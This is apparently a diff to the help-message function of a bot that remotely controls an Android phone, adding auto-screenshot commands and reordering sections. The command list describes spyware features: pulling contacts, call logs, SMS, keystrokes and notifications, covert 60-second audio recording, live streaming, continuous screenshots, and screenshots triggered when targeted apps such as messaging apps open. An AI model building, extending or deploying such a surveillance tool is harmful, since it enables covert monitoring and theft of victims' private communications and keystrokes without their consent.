@@ -78,11 +78,33 @@ function getHelpMessage() {
     return `<b>🤖 COMPLETE COMMAND LIST</b>
 
 <b>🔍 MONITORING COMMANDS</b>
+/help - Get full commands
 /status - Get full device status
 /location - Get current GPS location
 /battery - Get battery level only
 /storage - Get storage information
 /network - Get network info (IP, WiFi, Mobile)
+
+<b>📱 DATA EXTRACTION COMMANDS</b>
+/contacts - Get contact list
+/calllogs - Get recent call logs
+/sms - Get recent SMS messages
+/apps - List installed apps
+/keystrokes - Get recent keystrokes
+/notifications - Get recent notifications
+
+<b>🎤 RECORDING COMMANDS</b>
+/record - Start 60s audio recording NOW
+/stream_start - Start live streaming
+/stream_stop - Stop live streaming
+
+<b>⚙️ SERVICE CONTROL COMMANDS</b>
+/start_screenshot - Start screenshot SERVICE (continuous)
+/stop_screenshot - Stop screenshot service
+/start_recording - Start scheduled recording SERVICE
+/stop_recording - Stop recording service
+/start_stream - Start streaming service
+/stop_stream - Stop streaming service
 
 <b>📸 SCREENSHOT COMMANDS</b>
 /screenshot - Take a screenshot NOW
@@ -97,26 +119,14 @@ function getHelpMessage() {
 /resize_on [width] - Enable resize to specified width (default 800px)
 /resize_off - Disable resize
 
-<b>🎤 RECORDING COMMANDS</b>
-/record - Start 60s audio recording NOW
-/stream_start - Start live streaming
-/stream_stop - Stop live streaming
-
-<b>📱 DATA EXTRACTION COMMANDS</b>
-/contacts - Get contact list
-/calllogs - Get recent call logs
-/sms - Get recent SMS messages
-/apps - List installed apps
-/keystrokes - Get recent keystrokes
-/notifications - Get recent notifications
-
-<b>⚙️ SERVICE CONTROL COMMANDS</b>
-/start_screenshot - Start screenshot SERVICE (continuous)
-/stop_screenshot - Stop screenshot service
-/start_recording - Start scheduled recording SERVICE
-/stop_recording - Stop recording service
-/start_stream - Start streaming service
-/stop_stream - Stop streaming service
+<b>📸 AUTO-SCREENSHOT COMMANDS</b>
+/auto_on - Enable auto-screenshot when apps open
+/auto_off - Disable auto-screenshot
+/auto_status - Check auto-screenshot status
+/auto_delay [ms] - Set delay before screenshot (e.g., /auto_delay 3000)
+/add_target [package] - Add app to monitor (e.g., /add_target com.spotify)
+/remove_target [package] - Remove app from monitoring
+/target_apps - List all monitored apps
 
 <b>🛠️ UTILITY COMMANDS</b>
 /ping - Test connection
